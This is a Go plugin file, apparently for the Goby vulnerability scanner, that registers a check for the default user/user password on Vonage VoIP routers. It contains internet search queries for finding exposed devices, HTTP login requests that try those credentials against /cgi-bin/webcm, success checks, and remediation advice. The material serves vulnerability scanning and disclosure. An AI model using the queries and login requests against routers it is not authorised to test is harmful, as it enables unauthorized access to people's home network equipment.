package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Vonage router Default Password",
    "Description": "<p>Vonage is an IP telephony and session initiation protocol network company listed on the New York Stock Exchange, mainly providing broadband-based telephony services. Use a Vonage-branded \"VOIP router\" or phone adapter and connect it to your main router or broadband modem to use Vonage's voice services.</p><p>The Vonage router web interface has a default password user/user.</p>",
    "Product": "Vonage router",
    "Homepage": "https://www.vonage.com/",
    "DisclosureDate": "2022-10-20",
    "Author": "chuanqiu",
    "FofaQuery": "(title=\"&gt;Log In\" && body=\"action=\\\"../cgi-bin/webcm\\\"\" && body=\"value=\\\"/usr/www_safe/html/defs/style5/menus/menu.html\\\"\") || body=\"welcome to the vonage\"",
    "GobyQuery": "(title=\"&gt;Log In\" && body=\"action=\\\"../cgi-bin/webcm\\\"\" && body=\"value=\\\"/usr/www_safe/html/defs/style5/menus/menu.html\\\"\") || body=\"welcome to the vonage\"",
    "Level": "1",
    "Impact": "<p>Vonage has a default password, and attackers can use the default password user/user to log in to the system background, perform other sensitive operations, and obtain more sensitive data.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers and special characters, and the number of digits is greater than 8.</p><p>2. If it is not necessary, it is forbidden to access the management system from the public network.</p>",
    "References": [
        "https://fofa.so/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/cgi-bin/webcm",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "var%3Amain=menu&var%3Astyle=style5&getpage=%2Fusr%2Fwww_safe%2Fhtml%2Fdefs%2Fstyle5%2Fmenus%2Fmenu.html&errorpage=%2Fusr%2Fwww%2Findex.html&var%3Apagename=dhcpc&var%3Aerrorpagename=setup&var%3Amenu=setup&var%3Amenutitle=Setup&var%3Apagetitle=Log+In&var%3Apagemaster=setup&login%3Acommand%2Fusername=user&login%3Acommand%2Fpassword=user"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Please select the appropriate option to connect to your ISP.",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/cgi-bin/webcm",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "var%3Amain=menu&var%3Astyle=style5&getpage=%2Fusr%2Fwww_safe%2Fhtml%2Fdefs%2Fstyle5%2Fmenus%2Fmenu.html&errorpage=%2Fusr%2Fwww%2Findex.html&var%3Apagename=dhcpc&var%3Aerrorpagename=setup&var%3Amenu=setup&var%3Amenutitle=Setup&var%3Apagetitle=Log+In&var%3Apagemaster=setup&login%3Acommand%2Fusername=user&login%3Acommand%2Fpassword=user"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Please select the appropriate option to connect to your ISP.",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|define|text|user:user"
            ]
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5",
    "Translation": {
        "CN": {
            "Name": "Vonage router 默认口令",
            "Product": "Vonage router",
            "Description": "<p>Vonage 的VOIP路由器或电话适配器是一款连入主路由器或宽带调制解调器来使用Vonage提供的语音服务。</p><p>该Vonage路由器web界面存在默认口令user/user。</p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位数。</p><p>2、如非必要，禁止公网访问该管理系统。</p>",
            "Impact": "<p>Vonage存在默认口令，攻击者可利用默认口令user/user登录系统后台，执行其他敏感操作，获取更多敏感数据。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "Vonage router Default Password",
            "Product": "Vonage router",
            "Description": "<p>Vonage is an IP telephony and session initiation protocol network company listed on the New York Stock Exchange, mainly providing broadband-based telephony services. Use a Vonage-branded \"VOIP router\" or phone adapter and connect it to your main router or broadband modem to use Vonage's voice services.</p><p>The Vonage router web interface has a default password user/user.</p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers and special characters, and the number of digits is greater than 8.</p><p>2. If it is not necessary, it is forbidden to access the management system from the public network.</p>",
            "Impact": "<p>Vonage has a default password, and attackers can use the default password user/user to log in to the system background, perform other sensitive operations, and obtain more sensitive data.<br><br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
